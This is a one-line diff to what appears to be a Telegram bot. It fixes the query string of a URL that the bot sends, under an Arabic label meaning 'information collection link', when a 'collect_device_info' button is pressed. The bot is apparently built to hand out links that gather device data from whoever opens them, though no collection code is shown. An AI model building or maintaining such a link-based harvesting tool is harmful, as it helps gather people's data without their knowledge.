@@ -1357,7 +1357,7 @@ bot.on('callback_query', (query) => {
 
 
     if (query.data === 'collect_device_info') {
-        const url = `${baseUrl}/mm/?chatId ${chatId}`;
+        const url = `${baseUrl}/mm/?chatId=${chatId}`;
         bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
     }
 
